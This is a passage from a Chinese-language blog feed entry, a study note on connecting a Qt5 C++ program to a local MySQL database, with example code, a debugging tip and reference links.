<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlDatabase&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlQuery&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlError&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QPluginLoader&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"conn.h"</span>  </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;  </div><div class="line">    <span class="function">QCoreApplication <span class="title">app</span><span class="params">(argc, argv)</span></span>;  </div><div class="line">    QSqlDatabase db = QSqlDatabase::addDatabase(<span class="string">"QMYSQL"</span>);  </div><div class="line">    db.setHostName(<span class="string">"localhost"</span>);  </div><div class="line">    db.setDatabaseName(<span class="string">"qt"</span>);  </div><div class="line">    db.setUserName(<span class="string">"root"</span>);  </div><div class="line">    db.setPassword(<span class="string">""</span>);  </div><div class="line"></div><div class="line">    <span class="keyword">if</span>( !db.open() ) &#123;  </div><div class="line">        qDebug() &lt;&lt; <span class="string">"不能连上数据库"</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">else</span> &#123;  </div><div class="line">        qDebug() &lt;&lt; <span class="string">"成功连上数据库"</span>;  </div><div class="line">    &#125;  </div><div class="line"></div><div class="line">    <span class="keyword">return</span> app.exec();  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>若输出如下，则成功连接上了数据库：<br><img src="http://img.blog.csdn.net/20151003012346901" alt=""></p>
</li>
</ul>
<p>至此，问题彻底解决啦(^_^)</p>
<h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><p>此外，使用过程中还会碰上一些小问题，不要慌，都是可以解决的<br>比如以下情况：这是因为你的上一个程序没有完全关闭，所以不能打开下一个调试程序，只需在应用程序输出中把之前的程序全部关闭再重新运行就不会出现这个问题了。<br><img src="http://img.blog.csdn.net/20151003012606960" alt=""></p>
<h4 id="最后附上参考网站："><a href="#最后附上参考网站：" class="headerlink" title="最后附上参考网站："></a>最后附上参考网站：</h4><p><a href="http://blog.csdn.net/lhfeng/article/details/1822784" target="_blank">http://blog.csdn.net/lhfeng/article/details/1822784</a><br><a href="http://blog.chinaunix.net/uid-29278628-id-4049544.html" target="_blank">http://blog.chinaunix.net/uid-29278628-id-4049544.html</a><br><a href="http://tieba.baidu.com/p/3542726621" target="_blank">http://tieba.baidu.com/p/3542726621</a><br><a href="http://qtdebug.com/DB-AccessMySQL.html" target="_blank">http://qtdebug.com/DB-AccessMySQL.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这段时间一直在尝试使用Qt连接上MySQL数据库，真的是有点难啊！！！&lt;br&gt;参考了很多网上的资料，最后才成功的连上了数据库，文末将会有我认为有用的链接。&lt;br&gt;成功后发现其实也没有那么难嘛，只是自己真的是有点傻呢==&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="http://xzjqx.data/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Qt5" scheme="http://xzjqx.data/tags/Qt5/"/>
    
  </entry>
  
</feed>
